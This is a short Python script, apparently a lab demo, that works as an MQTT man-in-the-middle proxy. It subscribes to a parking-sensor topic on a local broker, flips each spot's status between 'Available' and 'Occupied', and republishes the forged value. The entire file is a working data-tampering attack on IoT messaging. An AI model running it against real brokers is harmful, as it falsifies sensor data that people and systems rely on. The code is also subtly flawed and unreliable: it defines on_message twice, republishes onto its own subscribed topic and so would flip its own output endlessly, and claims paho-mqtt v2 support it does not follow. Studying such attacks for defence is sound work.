#mitm_attack_proxy.py
import paho.mqtt.client as mqtt
from paho.mqtt.client import MQTTMessage
import time

# Configuration
BROKER = "localhost"
PORT = 1883

SOURCE_TOPIC = "parking/sensor"
TARGET_TOPIC = "parking/sensor"  # Re-publish on the same topic to simulate in-place modification

# Tampering function: Flip "Available" to "Occupied" for demo
def tamper_status(payload):
    try:
        sensor_id, status = payload.split(",")
        tampered_status = "Occupied" if status.strip() == "Available" else "Available"
        return f"{sensor_id},{tampered_status}"
    except Exception as e:
        print(f"[!] Payload parse error: {e}")
        return payload

# Callback when connected to broker (updated for paho-mqtt v2.x)
def on_connect(client, userdata, flags, reasonCode, properties=None):
    print(f"[+] Connected to broker at {BROKER}:{PORT}")
    print(f"[🔌] Subscribing to: {SOURCE_TOPIC}")
    client.subscribe(SOURCE_TOPIC)

def on_message(client, userdata, msg: MQTTMessage):
    print(f"[📨] Raw message received: {msg.payload}")
    ...

# Callback when a message is received
def on_message(client, userdata, msg: MQTTMessage):
    original = msg.payload.decode()
    modified = tamper_status(original)
    print(f"[✳️] Intercepted: {original} → Modified: {modified}")
    client.publish(TARGET_TOPIC, modified)

# Initialize client with modern callback API (no version param needed)
client = mqtt.Client(client_id="mqtt_mitm_proxy")
client.on_connect = on_connect
client.on_message = on_message

print("[📡] Launching MITM Proxy...")

client.connect(BROKER, PORT, 60)

try:
    client.loop_forever()
except KeyboardInterrupt:
    print("\n[!] MITM Proxy stopped.")
